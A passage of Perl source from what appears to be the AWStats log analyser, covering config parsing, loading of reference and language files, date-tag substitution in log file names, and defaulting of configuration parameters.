/^ExtraSectionName(\\d+)/ ) {\n\t\t\t$ExtraName[$1] = $value;\n\t\t\tnext;\n\t\t}\n\t\tif ( $param =~ /^ExtraSectionCodeFilter(\\d+)/ ) {\n\t\t\t@{ $ExtraCodeFilter[$1] } = split( /\\s+/, $value );\n\t\t\tnext;\n\t\t}\n\t\tif ( $param =~ /^ExtraSectionCondition(\\d+)/ ) {\n\t\t\t$ExtraCondition[$1] = $value;\n\t\t\tnext;\n\t\t}\n\t\tif ( $param =~ /^ExtraSectionStatTypes(\\d+)/ ) {\n\t\t\t$ExtraStatTypes[$1] = $value;\n\t\t\tnext;\n\t\t}\n\t\tif ( $param =~ /^ExtraSectionFirstColumnTitle(\\d+)/ ) {\n\t\t\t$ExtraFirstColumnTitle[$1] = $value;\n\t\t\tnext;\n\t\t}\n\t\tif ( $param =~ /^ExtraSectionFirstColumnValues(\\d+)/ ) {\n\t\t\t$ExtraFirstColumnValues[$1] = $value;\n\t\t\tnext;\n\t\t}\n\t\tif ( $param =~ /^ExtraSectionFirstColumnFunction(\\d+)/ ) {\n\t\t\t$ExtraFirstColumnFunction[$1] = $value;\n\t\t\tnext;\n\t\t}\n\t\tif ( $param =~ /^ExtraSectionFirstColumnFormat(\\d+)/ ) {\n\t\t\t$ExtraFirstColumnFormat[$1] = $value;\n\t\t\tnext;\n\t\t}\n\t\tif ( $param =~ /^ExtraSectionAddAverageRow(\\d+)/ ) {\n\t\t\t$ExtraAddAverageRow[$1] = $value;\n\t\t\tnext;\n\t\t}\n\t\tif ( $param =~ /^ExtraSectionAddSumRow(\\d+)/ ) {\n\t\t\t$ExtraAddSumRow[$1] = $value;\n\t\t\tnext;\n\t\t}\n\t\tif ( $param =~ /^MaxNbOfExtra(\\d+)/ ) {\n\t\t\t$MaxNbOfExtra[$1] = $value;\n\t\t\tnext;\n\t\t}\n\t\tif ( $param =~ /^MinHitExtra(\\d+)/ ) {\n\t\t\t$MinHitExtra[$1] = $value;\n\t\t\tnext;\n\t\t}\n\n\t\t# Plugins\n\t\tif ( $param =~ /^LoadPlugin/ ) {\n\t\t\t$value =~ s/[^a-zA-Z0-9_\\/\\.\\+:=\\?\\s%\\-]//g;\t\t# Sanitize plugin name and string param because it is used later in an eval.\n\t\t\tpush @PluginsToLoad, $value; next; \n\t\t}\n\n\t  # Other parameter checks we need to put after MaxNbOfExtra and MinHitExtra\n\t\tif ( $param =~ /^MaxNbOf(\\w+)/ ) { $MaxNbOf{$1} = $value; next; }\n\t\tif ( $param =~ /^MinHit(\\w+)/ )  { $MinHit{$1}  = $value; next; }\n\n# Check if this is a known parameter\n#\t\tif (! $ConfOk{$param}) { error(\"Unknown config parameter '$param' found line $conflinenb in file \\\"configFile\\\"\"); }\n# If parameters was not found previously, defined variable with name of param to value\n\t\t$$param = $value;\n\t}\n\n\tif ($Debug) {\n\t\tdebug(\"Config file read was \\\"$configFile\\\" (level $level)\");\n\t}\n}\n\n#------------------------------------------------------------------------------\n# Function:     Load the reference databases\n# Parameters:\tList of files to load\n# Input:\t\t$DIR\n# Output:\t\tArrays and Hash tables are defined\n# Return:       -\n#------------------------------------------------------------------------------\nsub Read_Ref_Data {\n\n# Check lib files in common possible directories :\n# Windows and standard package:        \t\t\"$DIR/lib\" (lib in same dir than awstats.pl)\n# Debian package:                    \t\t\"/usr/share/awstats/lib\"\n\tmy @PossibleLibDir = ( \"$DIR/lib\", \"/usr/share/awstats/lib\" );\n\tmy %FilePath       = ();\n\tmy %DirAddedInINC  = ();\n\tmy @FileListToLoad = ();\n\twhile ( my $file = shift ) { push @FileListToLoad, \"$file.pm\"; }\n\tif ($Debug) {\n\t\tdebug( \"Call to Read_Ref_Data with files to load: \"\n\t\t\t  . ( join( ',', @FileListToLoad ) ) );\n\t}\n\tforeach my $file (@FileListToLoad) {\n\t\tforeach my $dir (@PossibleLibDir) {\n\t\t\tmy $searchdir = $dir;\n\t\t\tif (   $searchdir\n\t\t\t\t&& ( !( $searchdir =~ /\\/$/ ) )\n\t\t\t\t&& ( !( $searchdir =~ /\\\\$/ ) ) )\n\t\t\t{\n\t\t\t\t$searchdir .= \"/\";\n\t\t\t}\n\t\t\tif ( !$FilePath{$file} )\n\t\t\t{    # To not load twice same file in different path\n\t\t\t\tif ( -s \"${searchdir}${file}\" ) {\n\t\t\t\t\t$FilePath{$file} = \"${searchdir}${file}\";\n\t\t\t\t\tif ($Debug) {\n\t\t\t\t\t\tdebug(\n\"Call to Read_Ref_Data [FilePath{$file}=\\\"$FilePath{$file}\\\"]\"\n\t\t\t\t\t\t);\n\t\t\t\t\t}\n\n\t\t\t\t\t# Note: cygwin perl 5.8 need a push + require file\n\t\t\t\t\tif ( !$DirAddedInINC{\"$dir\"} ) {\n\t\t\t\t\t\tpush @INC, \"$dir\";\n\t\t\t\t\t\t$DirAddedInINC{\"$dir\"} = 1;\n\t\t\t\t\t}\n\t\t\t\t\tmy $loadret = require \"$file\";\n\n\t\t\t\t   #my $loadret=(require \"$FilePath{$file}\"||require \"${file}\");\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t\tif ( !$FilePath{$file} ) {\n\t\t\tmy $filetext = $file;\n\t\t\t$filetext =~ s/\\.pm$//;\n\t\t\t$filetext =~ s/_/ /g;\n\t\t\twarning(\n\"Warning: Can't read file \\\"$file\\\" ($filetext detection will not work correctly).\\nCheck if file is in \\\"\"\n\t\t\t\t  . ( $PossibleLibDir[0] )\n\t\t\t\t  . \"\\\" directory and is readable.\" );\n\t\t}\n\t}\n\n\t# Sanity check (if loaded)\n\tif ( ( scalar keys %OSHashID )\n\t\t&& @OSSearchIDOrder != scalar keys %OSHashID )\n\t{\n\t\terror(  \"Not same number of records of OSSearchIDOrder (\"\n\t\t\t  . (@OSSearchIDOrder)\n\t\t\t  . \" entries) and OSHashID (\"\n\t\t\t  . ( scalar keys %OSHashID )\n\t\t\t  . \" entries) in OS database. Check your file \"\n\t\t\t  . $FilePath{\"operating_systems.pm\"} );\n\t}\n\tif (\n\t\t( scalar keys %SearchEnginesHashID )\n\t\t&& ( @SearchEnginesSearchIDOrder_list1 +\n\t\t\t@SearchEnginesSearchIDOrder_list2 +\n\t\t\t@SearchEnginesSearchIDOrder_listgen ) != scalar\n\t\tkeys %SearchEnginesHashID\n\t  )\n\t{\n\t\terror(\n\"Not same number of records of SearchEnginesSearchIDOrder_listx (total is \"\n\t\t\t  . (\n\t\t\t\t@SearchEnginesSearchIDOrder_list1 +\n\t\t\t\t  @SearchEnginesSearchIDOrder_list2 +\n\t\t\t\t  @SearchEnginesSearchIDOrder_listgen\n\t\t\t  )\n\t\t\t  . \" entries) and SearchEnginesHashID (\"\n\t\t\t  . ( scalar keys %SearchEnginesHashID )\n\t\t\t  . \" entries) in Search Engines database. Check your file \"\n\t\t\t  . $FilePath{\"search_engines.pm\"}\n\t\t\t  . \" is up to date.\"\n\t\t);\n\t}\n\tif ( ( scalar keys %BrowsersHashIDLib )\n\t\t&& @BrowsersSearchIDOrder != ( scalar keys %BrowsersHashIDLib ) - ( scalar keys %BrowsersFamily ) )\n\t{\n\t\t#foreach (sort keys %BrowsersHashIDLib)\n\t\t#{\n\t\t#\tprint $_.\"\\n\";\n\t\t#}\n\t\t#foreach (sort @BrowsersSearchIDOrder)\n\t\t#{\n\t\t#\tprint $_.\"\\n\";\n\t\t#}\n\t\terror(  \"Not same number of records of BrowsersSearchIDOrder (\"\n\t\t\t  . (@BrowsersSearchIDOrder)\n\t\t\t  . \" entries) and BrowsersHashIDLib (\"\n\t\t\t  . ( ( scalar keys %BrowsersHashIDLib ) - ( scalar keys %BrowsersFamily ) )\n\t\t\t  . \" entries without firefox,opera,chrome,safari,konqueror,svn,msie,netscape,edge) in Browsers database. May be you updated AWStats without updating browsers.pm file or you made changed into browsers.pm not correctly. Check your file \"\n\t\t\t  . $FilePath{\"browsers.pm\"}\n\t\t\t  . \" is up to date.\" );\n\t}\n\tif (\n\t\t( scalar keys %RobotsHashIDLib )\n\t\t&& ( @RobotsSearchIDOrder_list1 + @RobotsSearchIDOrder_list2 +\n\t\t\t@RobotsSearchIDOrder_listgen ) !=\n\t\t( scalar keys %RobotsHashIDLib ) - 1\n\t  )\n\t{\n\t\terror(\n\t\t\t\"Not same number of records of RobotsSearchIDOrder_listx (total is \"\n\t\t\t  . (\n\t\t\t\t@RobotsSearchIDOrder_list1 + @RobotsSearchIDOrder_list2 +\n\t\t\t\t  @RobotsSearchIDOrder_listgen\n\t\t\t  )\n\t\t\t  . \" entries) and RobotsHashIDLib (\"\n\t\t\t  . ( ( scalar keys %RobotsHashIDLib ) - 1 )\n\t\t\t  . \" entries without 'unknown') in Robots database. Check your file \"\n\t\t\t  . $FilePath{\"robots.pm\"}\n\t\t\t  . \" is up to date.\"\n\t\t);\n\t}\n}\n\n#------------------------------------------------------------------------------\n# Function:     Get the messages for a specified language\n# Parameters:\tLanguageId\n# Input:\t\t$DirLang $DIR\n# Output:\t\t$Message table is defined in memory\n# Return:\t\tNone\n#------------------------------------------------------------------------------\nsub Read_Language_Data {\n\n\t# Check lang files in common possible directories :\n\t# Windows and standard package:         \t\"$DIR/lang\" (lang in same dir than awstats.pl)\n\t# Debian package :                    \t\t\"/usr/share/awstats/lang\"\n\tmy @PossibleLangDir =\n\t  ( \"$DirLang\", \"$DIR/lang\", \"/usr/share/awstats/lang\" );\n\n\tmy $FileLang = '';\n\tforeach (@PossibleLangDir) {\n\t\tmy $searchdir = $_;\n\t\tif ( $searchdir =~ /\\|/ )\t\t# We refuse path that contains \"|\" \n\t\t{\n\t\t\terror(\"DirLang parameter can't contains character |\");\n\t\t\tnext;\t\n\t\t}\n\t\tif ( $searchdir\n\t\t\t&& ( !( $searchdir =~ /\\/$/ ) )\n\t\t\t&& ( !( $searchdir =~ /\\\\$/ ) ) )\n\t\t{\n\t\t\t$searchdir .= \"/\";\n\t\t}\n\t\tif ( open( LANG, \"${searchdir}awstats-$_[0].txt\" ) ) {\n\t\t\t$FileLang = \"${searchdir}awstats-$_[0].txt\";\n\t\t\tlast;\n\t\t}\n\t}\n\n\t# If file not found, we try english\n\tif ( !$FileLang ) {\n\t\tforeach (@PossibleLangDir) {\n\t\t\tmy $searchdir = $_;\n\t\t\tif (   $searchdir\n\t\t\t\t&& ( !( $searchdir =~ /\\/$/ ) )\n\t\t\t\t&& ( !( $searchdir =~ /\\\\$/ ) ) )\n\t\t\t{\n\t\t\t\t$searchdir .= \"/\";\n\t\t\t}\n\t\t\tif ( open( LANG, \"${searchdir}awstats-en.txt\" ) ) {\n\t\t\t\t$FileLang = \"${searchdir}awstats-en.txt\";\n\t\t\t\tlast;\n\t\t\t}\n\t\t}\n\t}\n\tif ($Debug) {\n\t\tdebug(\"Call to Read_Language_Data [FileLang=\\\"$FileLang\\\"]\");\n\t}\n\tif ($FileLang) {\n\t\tmy $i = 0;\n\t\tbinmode LANG;    # Might avoid 'Malformed UTF-8 errors'\n\t\tmy $cregcode    = qr/^PageCode=[\\t\\s\\\"\\']*([\\w-]+)/i;\n\t\tmy $cregdir     = qr/^PageDir=[\\t\\s\\\"\\']*([\\w-]+)/i;\n\t\tmy $cregmessage = qr/^Message\\d+=/i;\n\t\twhile (<LANG>) {\n\t\t\tchomp $_;\n\t\t\ts/\\r//;\n\t\t\tif ( $_ =~ /$cregcode/o ) { $PageCode = $1; }\n\t\t\tif ( $_ =~ /$cregdir/o )  { $PageDir  = $1; }\n\t\t\tif ( $_ =~ s/$cregmessage//o ) {\n\t\t\t\t$_ =~ s/^#.*//;       # Remove comments\n\t\t\t\t$_ =~ s/\\s+#.*//;     # Remove comments\n\t\t\t\t$_ =~ tr/\\t /  /s;    # Change all blanks into \" \"\n\t\t\t\t$_ =~ s/^\\s+//;\n\t\t\t\t$_ =~ s/\\s+$//;\n\t\t\t\t$_ =~ s/^\\\"//;\n\t\t\t\t$_ =~ s/\\\"$//;\n\t\t\t\t$Message[$i] = $_;\n\t\t\t\t$i++;\n\t\t\t}\n\t\t}\n\t\tclose(LANG);\n\t}\n\telse {\n\t\twarning(\n\"Warning: Can't find language files for \\\"$_[0]\\\". English will be used.\"\n\t\t);\n\t}\n\n\t# Some language string changes\n\tif ( $LogType eq 'M' ) {    # For mail\n\t\t$Message[8]  = $Message[151];\n\t\t$Message[9]  = $Message[152];\n\t\t$Message[57] = $Message[149];\n\t\t$Message[75] = $Message[150];\n\t}\n\tif ( $LogType eq 'F' ) {    # For web\n\n\t}\n}\n\n#------------------------------------------------------------------------------\n# Function:     Substitute date tags in a string by value\n# Parameters:\tString\n# Input:\t\tAll global variables\n# Output:\t\tChange on some global variables\n# Return:\t\tString\n#------------------------------------------------------------------------------\nsub Substitute_Tags {\n\tmy $SourceString = shift;\n\tif ($Debug) { debug(\"Call to Substitute_Tags on $SourceString\"); }\n\n\tmy %MonthNumLibEn = (\n\t\t\"01\", \"Jan\", \"02\", \"Feb\", \"03\", \"Mar\", \"04\", \"Apr\",\n\t\t\"05\", \"May\", \"06\", \"Jun\", \"07\", \"Jul\", \"08\", \"Aug\",\n\t\t\"09\", \"Sep\", \"10\", \"Oct\", \"11\", \"Nov\", \"12\", \"Dec\"\n\t);\n\n\twhile ( $SourceString =~ /%([ymdhwYMDHWNSO]+)-(\\(\\d+\\)|\\d+)/ ) {\n\n\t\t# Accept tag %xx-dd and %xx-(dd)\n\t\tmy $timetag     = \"$1\";\n\t\tmy $timephase   = quotemeta(\"$2\");\n\t\tmy $timephasenb = \"$2\";\n\t\t$timephasenb =~ s/[^\\d]//g;\n\t\tif ($Debug) {\n\t\t\tdebug(\n\" Found a time tag '$timetag' with a phase of '$timephasenb' hour in log file name\",\n\t\t\t\t1\n\t\t\t);\n\t\t}\n\n\t\t# Get older time\n\t\tmy (\n\t\t\t$oldersec,   $oldermin,  $olderhour, $olderday,\n\t\t\t$oldermonth, $olderyear, $olderwday, $olderyday\n\t\t  )\n\t\t  = localtime( $starttime - ( $timephasenb * 3600 ) );\n\t\tmy $olderweekofmonth = int( $olderday / 7 );\n\t\tmy $olderweekofyear  =\n\t\t  int(\n\t\t\t( $olderyday - 1 + 6 - ( $olderwday == 0 ? 6 : $olderwday - 1 ) ) /\n\t\t\t  7 ) + 1;\n\t\tif ( $olderweekofyear > 53 ) { $olderweekofyear = 1; }\n\t\tmy $olderdaymod = $olderday % 7;\n\t\t$olderwday++;\n\t\tmy $olderns =\n\t\t  Time::Local::timegm( 0, 0, 0, $olderday, $oldermonth, $olderyear );\n\n\t\tif ( $olderdaymod <= $olderwday ) {\n\t\t\tif ( ( $olderwday != 7 ) || ( $olderdaymod != 0 ) ) {\n\t\t\t\t$olderweekofmonth = $olderweekofmonth + 1;\n\t\t\t}\n\t\t}\n\t\tif ( $olderdaymod > $olderwday ) {\n\t\t\t$olderweekofmonth = $olderweekofmonth + 2;\n\t\t}\n\n\t\t# Change format of time variables\n\t\t$olderweekofmonth = \"0$olderweekofmonth\";\n\t\tif ( $olderweekofyear < 10 ) { $olderweekofyear = \"0$olderweekofyear\"; }\n\t\tif ( $olderyear < 100 ) { $olderyear += 2000; }\n\t\telse { $olderyear += 1900; }\n\t\tmy $oldersmallyear = $olderyear;\n\t\t$oldersmallyear =~ s/^..//;\n\t\tif ( ++$oldermonth < 10 ) { $oldermonth = \"0$oldermonth\"; }\n\t\tif ( $olderday < 10 )     { $olderday   = \"0$olderday\"; }\n\t\tif ( $olderhour < 10 )    { $olderhour  = \"0$olderhour\"; }\n\t\tif ( $oldermin < 10 )     { $oldermin   = \"0$oldermin\"; }\n\t\tif ( $oldersec < 10 )     { $oldersec   = \"0$oldersec\"; }\n\n\t\t# Replace tag with new value\n\t\tif ( $timetag eq 'YYYY' ) {\n\t\t\t$SourceString =~ s/%YYYY-$timephase/$olderyear/ig;\n\t\t\tnext;\n\t\t}\n\t\tif ( $timetag eq 'YY' ) {\n\t\t\t$SourceString =~ s/%YY-$timephase/$oldersmallyear/ig;\n\t\t\tnext;\n\t\t}\n\t\tif ( $timetag eq 'MM' ) {\n\t\t\t$SourceString =~ s/%MM-$timephase/$oldermonth/ig;\n\t\t\tnext;\n\t\t}\n\t\tif ( $timetag eq 'MO' ) {\n\t\t\t$SourceString =~ s/%MO-$timephase/$MonthNumLibEn{$oldermonth}/ig;\n\t\t\tnext;\n\t\t}\n\t\tif ( $timetag eq 'DD' ) {\n\t\t\t$SourceString =~ s/%DD-$timephase/$olderday/ig;\n\t\t\tnext;\n\t\t}\n\t\tif ( $timetag eq 'HH' ) {\n\t\t\t$SourceString =~ s/%HH-$timephase/$olderhour/ig;\n\t\t\tnext;\n\t\t}\n\t\tif ( $timetag eq 'NS' ) {\n\t\t\t$SourceString =~ s/%NS-$timephase/$olderns/ig;\n\t\t\tnext;\n\t\t}\n\t\tif ( $timetag eq 'WM' ) {\n\t\t\t$SourceString =~ s/%WM-$timephase/$olderweekofmonth/g;\n\t\t\tnext;\n\t\t}\n\t\tif ( $timetag eq 'Wm' ) {\n\t\t\tmy $olderweekofmonth0 = $olderweekofmonth - 1;\n\t\t\t$SourceString =~ s/%Wm-$timephase/$olderweekofmonth0/g;\n\t\t\tnext;\n\t\t}\n\t\tif ( $timetag eq 'WY' ) {\n\t\t\t$SourceString =~ s/%WY-$timephase/$olderweekofyear/g;\n\t\t\tnext;\n\t\t}\n\t\tif ( $timetag eq 'Wy' ) {\n\t\t\tmy $olderweekofyear0 = sprintf( \"%02d\", $olderweekofyear - 1 );\n\t\t\t$SourceString =~ s/%Wy-$timephase/$olderweekofyear0/g;\n\t\t\tnext;\n\t\t}\n\t\tif ( $timetag eq 'DW' ) {\n\t\t\t$SourceString =~ s/%DW-$timephase/$olderwday/g;\n\t\t\tnext;\n\t\t}\n\t\tif ( $timetag eq 'Dw' ) {\n\t\t\tmy $olderwday0 = $olderwday - 1;\n\t\t\t$SourceString =~ s/%Dw-$timephase/$olderwday0/g;\n\t\t\tnext;\n\t\t}\n\n\t\t# If unknown tag\n\t\terror(\"Unknown tag '\\%$timetag' in parameter.\");\n\t}\n\n# Replace %YYYY %YY %MM %DD %HH with current value. Kept for backward compatibility.\n\t$SourceString =~ s/%YYYY/$nowyear/ig;\n\t$SourceString =~ s/%YY/$nowsmallyear/ig;\n\t$SourceString =~ s/%MM/$nowmonth/ig;\n\t$SourceString =~ s/%MO/$MonthNumLibEn{$nowmonth}/ig;\n\t$SourceString =~ s/%DD/$nowday/ig;\n\t$SourceString =~ s/%HH/$nowhour/ig;\n\t$SourceString =~ s/%NS/$nowns/ig;\n\t$SourceString =~ s/%WM/$nowweekofmonth/g;\n\tmy $nowweekofmonth0 = $nowweekofmonth - 1;\n\t$SourceString =~ s/%Wm/$nowweekofmonth0/g;\n\t$SourceString =~ s/%WY/$nowweekofyear/g;\n\tmy $nowweekofyear0 = $nowweekofyear - 1;\n\t$SourceString =~ s/%Wy/$nowweekofyear0/g;\n\t$SourceString =~ s/%DW/$nowwday/g;\n\tmy $nowwday0 = $nowwday - 1;\n\t$SourceString =~ s/%Dw/$nowwday0/g;\n\n\treturn $SourceString;\n}\n\n#------------------------------------------------------------------------------\n# Function:     Check if all parameters are correctly defined. If not set them to default.\n# Parameters:\tNone\n# Input:\t\tAll global variables\n# Output:\t\tChange on some global variables\n# Return:\t\tNone\n#------------------------------------------------------------------------------\nsub Check_Config {\n\tif ($Debug) { debug(\"Call to Check_Config\"); }\n\n\t# Show initial values of main parameters before check\n\tif ($Debug) {\n\t\tdebug( \" LogFile='$LogFile'\",           2 );\n\t\tdebug( \" LogType='$LogType'\",           2 );\n\t\tdebug( \" LogFormat='$LogFormat'\",       2 );\n\t\tdebug( \" LogSeparator='$LogSeparator'\", 2 );\n\t\tdebug( \" DNSLookup='$DNSLookup'\",       2 );\n\t\tdebug( \" DirData='$DirData'\",           2 );\n\t\tdebug( \" DirCgi='$DirCgi'\",             2 );\n\t\tdebug( \" DirIcons='$DirIcons'\",         2 );\n\t\tdebug( \" NotPageList \" .    ( join( ',', keys %NotPageList ) ),    2 );\n\t\tdebug( \" ValidHTTPCodes \" . ( join( ',', keys %ValidHTTPCodes ) ), 2 );\n\t\tdebug( \" ValidSMTPCodes \" . ( join( ',', keys %ValidSMTPCodes ) ), 2 );\n\t\tdebug( \" UseFramesWhenCGI=$UseFramesWhenCGI\",     2 );\n\t\tdebug( \" BuildReportFormat=$BuildReportFormat\",   2 );\n\t\tdebug( \" BuildHistoryFormat=$BuildHistoryFormat\", 2 );\n\t\tdebug(\n\t\t\t\" URLWithQueryWithOnlyFollowingParameters=\"\n\t\t\t  . ( join( ',', @URLWithQueryWithOnly ) ),\n\t\t\t2\n\t\t);\n\t\tdebug(\n\t\t\t\" URLWithQueryWithoutFollowingParameters=\"\n\t\t\t  . ( join( ',', @URLWithQueryWithout ) ),\n\t\t\t2\n\t\t);\n\t}\n\n\t# Main section\n\t$LogFile = &Substitute_Tags($LogFile);\n\tif ( !$LogFile ) {\n\t\terror(\"LogFile parameter is not defined in config/domain file\");\n\t}\n\tif ( $LogType !~ /[WSMF]/i ) { $LogType = 'W'; }\n\t$LogFormat =~ s/\\\\//g;\n\tif ( !$LogFormat ) {\n\t\terror(\"LogFormat parameter is not defined in config/domain file\");\n\t}\n\tif ( $LogFormat =~ /^\\d$/ && $LogFormat !~ /[1-6]/ ) {\n\t\terror(\n\"LogFormat parameter is wrong in config/domain file. Value is '$LogFormat' (should be 1,2,3,4,5 or a 'personalized AWStats log format string')\"\n\t\t);\n\t}\n\t$LogSeparator ||= \"\\\\s\";\n\t$DirData      ||= '.';\n\t$DirCgi       ||= '/cgi-bin';\n\t$DirIcons     ||= '/icon';\n\tif ( $DNSLookup !~ /[0-2]/ ) {\n\t\terror(\n\"DNSLookup parameter is wrong in config/domain file. Value is '$DNSLookup' (should be 0,1 or 2)\"\n\t\t);\n\t}\n\tif ( !$SiteDomain ) {\n\t\terror(\n\"SiteDomain parameter not defined in your config/domain file. You must edit it for using this version of AWStats.\"\n\t\t);\n\t}\n\tif ( $AllowToUpdateStatsFromBrowser !~ /[0-1]/ ) {\n\t\t$AllowToUpdateStatsFromBrowser = 0;\n\t}\n\tif ( $AllowFullYearView !~ /[0-3]/ ) { $AllowFullYearView = 2; }\n\n\t# Optional setup section\n\tif ( !$SectionsToBeSaved )             { $SectionsToBeSaved   = 'all'; }\n\tif ( $EnableLockForUpdate !~ /[0-1]/ ) { $EnableLockForUpdate = 0; }\n\t$DNSStaticCacheFile     ||= 'dnscache.txt';\n\t$DNSLastUpdateCacheFile ||= 'dnscachelastupdate.txt';\n\tif ( $DNSStaticCacheFile eq $DNSLastUpdateCacheFile ) {\n\t\terror(\n\"DNSStaticCacheFile and DNSLastUpdateCacheFile must have different values.\"\n\t\t);\n\t}\n\tif ( $AllowAccessFromWebToAuthenticatedUsersOnly !~ /[0-1]/ ) {\n\t\t$AllowAccessFromWebToAuthenticatedUsersOnly = 0;\n\t}\n\tif ( $CreateDirDataIfNotExists !~ /[0-1]/ ) {\n\t\t$CreateDirDataIfNotExists = 0;\n\t}\n\tif ( $BuildReportFormat !~ /html|xhtml|xml/i ) {\n\t\t$BuildReportFormat = 'html';\n\t}\n\tif ( $BuildHistoryFormat !~ /text|xml/ ) { $BuildHistoryFormat = 'text'; }\n\tif ( $SaveDatabaseFilesWithPermissionsForEveryone !~ /[0-1]/ ) {\n\t\t$SaveDatabaseFilesWithPermissionsForEveryone = 0;\n\t}\n\tif ( $PurgeLogFile !~ /[0-1]/ ) { $PurgeLogFile = 0; }\n\tif ( $KeepBackupOfHistoricFiles !~ /[0-1]/ ) {\n\t\t$KeepBackupOfHistoricFiles = 0;\n\t}\n\t$DefaultFile[0] ||= 'index.html';\n\tif ( $AuthenticatedUsersNotCaseSensitive !~ /[0-1]/ ) {\n\t\t$AuthenticatedUsersNotCaseSensitive = 0;\n\t}\n\tif ( $URLNotCaseSensitive !~ /[0-1]/ ) { $URLNotCaseSensitive = 0; }\n\tif ( $URLWithAnchor !~ /[0-1]/ )       { $URLWithAnchor       = 0; }\n\t$URLQuerySeparators =~ s/\\s//g;\n\tif ( !$URLQuerySeparators )             { $URLQuerySeparators   = '?;'; }\n\tif ( $URLWithQuery !~ /[0-1]/ )         { $URLWithQuery         = 0; }\n\tif ( $URLReferrerWithQuery !~ /[0-1]/ ) { $URLReferrerWithQuery = 0; }\n\tif ( $WarningMessages !~ /[0-1]/ )      { $WarningMessages      = 1; }\n\tif ( $DebugMessages !~ /[0-1]/ )        { $DebugMessages        = 0; }\n\n\tif ( $NbOfLinesForCorruptedLog !~ /^\\d+/ || $NbOfLinesForCorruptedLog < 1 )\n\t{\n\t\t$NbOfLinesForCorruptedLog = 50;\n\t}\n\tif ( $Expires !~ /^\\d+/ )   { $Expires  = 0; }\n\tif ( $DecodeUA !~ /[0-1]/ ) { $DecodeUA = 0; }\n\t$MiscTrackerUrl ||= '/js/awstats_misc_tracker.js';\n\n\t# Optional accuracy setup section\n\tif ( $LevelForWormsDetection !~ /^\\d+/ )  { $LevelForWormsDetection  = 0; }\n\tif ( $LevelForRobotsDetection !~ /^\\d+/ ) { $LevelForRobotsDetection = 2; }\n\tif ( $LevelForBrowsersDetection !~ /^\\w+/ ) {\n\t\t$LevelForBrowsersDetection = 2;\n\t}    # Can be 'allphones'\n\tif ( $LevelForOSDetection !~ /^\\d+/ )    { $LevelForOSDetection    = 2; }\n\tif ( $LevelForRefererAnalyze !~ /^\\d+/ ) { $LevelForRefererAnalyze = 2; }\n\tif ( $LevelForFileTypesDetection !~ /^\\d+/ ) {\n\t\t$LevelForFileTypesDetection = 2;\n\t}\n\tif ( $LevelForSearchEnginesDetection !~ /^\\d+/ ) {\n\t\t$LevelForSearchEnginesDetection = 2;\n\t}\n\tif ( $LevelForKeywordsDetection !~ /^\\d+/ ) {\n\t\t$LevelForKeywordsDetection = 2;\n\t}\n\n\t# Optional extra setup section\n\tforeach my $extracpt ( 1 .. @ExtraName - 1 ) {\n\t\tif ( $ExtraStatTypes[$extracpt] !~ /[PHBL]/ ) {\n\t\t\t$ExtraStatTypes[$extracpt] = 'PHBL';\n\t\t}\n\t\tif (   $MaxNbOfExtra[$extracpt] !~ /^\\d+$/\n\t\t\t|| $MaxNbOfExtra[$extracpt] < 0 )\n\t\t{\n\t\t\t$MaxNbOfExtra[$extracpt] = 20;\n\t\t}\n\t\tif ( $MinHitExtra[$extracpt] !~ /^\\d+$/ || $MinHitExtra[$extracpt] < 1 )\n\t\t{\n\t\t\t$MinHitExtra[$extracpt] = 1;\n\t\t}\n\t\tif ( !$ExtraFirstColumnValues[$extracpt] ) {\n\t\t\terror(\n\"Extra section number $extracpt is defined without ExtraSectionFirstColumnValues$extracpt parameter\"\n\t\t\t);\n\t\t}\n\t\tif ( !$ExtraFirstColumnFormat[$extracpt] ) {\n\t\t\t$ExtraFirstColumnFormat[$extracpt] = '%s';\n\t\t}\n\t}\n\n\t# Optional appearance setup section\n\tif ( $MaxRowsInHTMLOutput !~ /^\\d+/ || $MaxRowsInHTMLOutput < 1 ) {\n\t\t$MaxRowsInHTMLOutput = 1000;\n\t}\n\tif ( $ShowMenu !~ /[01]/ )            { $ShowMenu       = 1; }\n\tif ( $ShowSummary !~ /[01UVPHB]/ )    { $ShowSummary    = 'UVPHB'; }\n\tif ( $ShowMonthStats !~ /[01UVPHB]/ ) { $ShowMonthStats = 'UVPHB'; }\n\tif ( $ShowDaysOfMonthStats !~ /[01VPHB]/ ) {\n\t\t$ShowDaysOfMonthStats = 'VPHB';\n\t}\n\tif ( $ShowDaysOfWeekStats !~ /[01PHBL]/ ) { $ShowDaysOfWeekStats = 'PHBL'; }\n\tif ( $ShowHoursStats !~ /[01PHBL]/ )      { $ShowHoursStats      = 'PHBL'; }\n\tif ( $ShowDomainsStats !~ /[01PHB]/ )     { $ShowDomainsStats    = 'PHB'; }\n\tif ( $ShowHostsStats !~ /[01PHBL]/ )      { $ShowHostsStats      = 'PHBL'; }\n\n\tif ( $ShowAuthenticatedUsers !~ /[01PHBL]/ ) {\n\t\t$ShowAuthenticatedUsers = 0;\n\t}\n\tif ( $ShowRobotsStats !~ /[01HBL]/ )     { $ShowRobotsStats     = 'HBL'; }\n\tif ( $ShowWormsStats !~ /[01HBL]/ )      { $ShowWormsStats      = 'HBL'; }\n\tif ( $ShowEMailSenders !~ /[01HBML]/ )   { $ShowEMailSenders    = 0; }\n\tif ( $ShowEMailReceivers !~ /[01HBML]/ ) { $ShowEMailReceivers  = 0; }\n\tif ( $ShowSessionsStats !~ /[01]/ )      { $ShowSessionsStats   = 1; }\n\tif ( $ShowPagesStats !~ /[01PBEX]/i )    { $ShowPagesStats      = 'PBEX'; }\n\tif ( $ShowFileTypesStats !~ /[01HBC]/ )  { $ShowFileTypesStats  = 'HB'; }\n\tif ( $ShowDownloadsStats !~ /[01HB]/ )   { $ShowDownloadsStats  = 'HB';}\n\tif ( $ShowFileSizesStats !~ /[01]/ )     { $ShowFileSizesStats  = 1; }\n\tif ( $ShowOSStats !~ /[01]/ )            { $ShowOSStats         = 1; }\n\tif ( $ShowBrowsersStats !~ /[01]/ )      { $ShowBrowsersStats   = 1; }\n\tif ( $ShowScreenSizeStats !~ /[01]/ )    { $ShowScreenSizeStats = 0; }\n\tif ( $ShowOriginStats !~ /[01PH]/ )      { $ShowOriginStats     = 'PH'; }\n\tif ( $ShowKeyphrasesStats !~ /[01]/ )    { $ShowKeyphrasesStats = 1; }\n\tif ( $ShowKeywordsStats !~ /[01]/ )      { $ShowKeywordsStats   = 1; }\n\tif ( $ShowClusterStats !~ /[01PHB]/ )    { $ShowClusterStats    = 0; }\n\tif ( $ShowMiscStats !~ /[01anjdfrqwp]/ ) { $ShowMiscStats       = 'a'; }\n\tif ( 